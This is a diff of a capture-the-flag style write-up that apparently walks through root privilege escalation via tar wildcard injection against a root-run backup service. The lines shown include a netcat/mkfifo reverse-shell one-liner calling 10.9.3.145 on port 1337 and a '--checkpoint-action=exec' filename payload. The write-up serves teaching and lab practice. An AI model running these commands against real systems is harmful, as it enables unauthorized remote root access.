@@ -70,7 +70,7 @@ we have our sweet reverse shell. so, stabilize it
 The name of the attack is Wildcard injection, and it's a way to make tar run an executable for us. Since the backup service is running as root, if we make this executable a reverse shell, then we got ourselves a root shell. 
 set your netcat listener.
 
-```1. echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.3.145 1337 >/tmp/f" > shell.sh```
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.3.145 1337 >/tmp/f" > shell.sh
 
 ```2. echo ""> "--checkpoint-action=exec=sh shell.sh"```
 
@@ -82,7 +82,8 @@ And we are root lol ;)
 
 Thanks hope you had fun!
 
-For any enquiries shoot me a dm on twitter @ ![link](https://twitter.co/0x_venus)
+
+ For any enquiries shoot me a dm on twitter @ ![link](https://twitter.co/0x_venus)
 
 
 
